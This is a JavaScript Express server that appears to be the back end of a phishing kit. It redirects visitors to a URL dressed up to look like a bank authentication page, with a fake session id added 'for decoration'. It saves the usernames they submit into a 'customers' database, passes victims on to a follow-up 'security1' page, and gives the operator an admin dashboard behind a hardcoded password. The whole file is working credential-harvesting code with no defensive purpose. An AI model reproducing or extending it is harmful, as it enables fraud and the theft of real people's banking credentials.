const express = require("express");
const http = require("http");
const app = express();
const server = http.createServer(app);
const path = require("path");
const session = require("express-session");
const bodyParser = require("body-parser");
const chance = require("chance").Chance();
const io = require("socket.io")(server, {
    // config goes here
})

// set panel password
process.env.ADMIN_PASSWORD = "ghost123"
process.env.DB_URI = "mongodb://localhost:27017/customers"


const mongoose = require("mongoose");
const db_uri = process.env.DB_URI;
const port = 3000;
const User = require("./User");

// connect to database
mongoose.connect(db_uri, {useNewUrlParser: true});


app.use(session({
    secret: "hljdhc10870sa87d09qa8c7___d189c760as9d7SX", 
    resave: false, 
    saveUninitialized: true, 
    // cookie: {secure: true}  
}));

app.use(
    bodyParser.json()
);

app.use(
    bodyParser.urlencoded({extended: true})
);

/**
 * Admin route.
 * Requires cookie authentication.
 * Unauthed users, redirected to login page
 */
app
    .get("/admin", async (req, res) => {
        console.log(req.session);
        if (!req.session.authed) {
            return res.sendFile(
                path.join(__dirname, "/public/adminLogin.html")
            )
        }

        return res.sendFile(
            path.join(__dirname, "/public/adminDashboard.html")
        )
})

/**
 * Admin login route
 */
app
    .post("/admin/login", async (req, res) => {
        if (req.body.password !== process.env.ADMIN_PASSWORD) {
            return res.redirect("/admin?error='incorrect'")
        }

        // authenticate the session
        req.session.authed = true;

        return res.redirect("/admin")
    });

/**
 * Client routes
 */
app
    .get("/", async (req, res) => {
        // does the route have params (this is just for decoration)
        if (!Object.keys(req.query).length) {return res.redirect(`/?uims/dl/DSP_AUTHENTICATION;jsessionid=${chance.integer({min: 0})}`)}
        return res.sendFile(path.join(__dirname, "/public/client_pages/index.html"))
    })

app.get("/security1", async (req, res) => {
    return res.sendFile(path.join(__dirname, "/public/client_pages/security1.html"))
})

// Data submission routes
app
    .post("/", async (req, res) => {
        console.log(req.body);
        if (!req.body.username) {return res.redirect("/")}

        // create new user only if it doesn't exist
        const exists = await User.findOne({id: req.session.id});

        if (!exists) {
            await new User({
                username: req.body.username, 
                id: req.session.id,
            }).save();

            console.log("created new user");
            return res.redirect("/security1");
        }
    })

server.listen(port, () => {
    console.log("running!")
})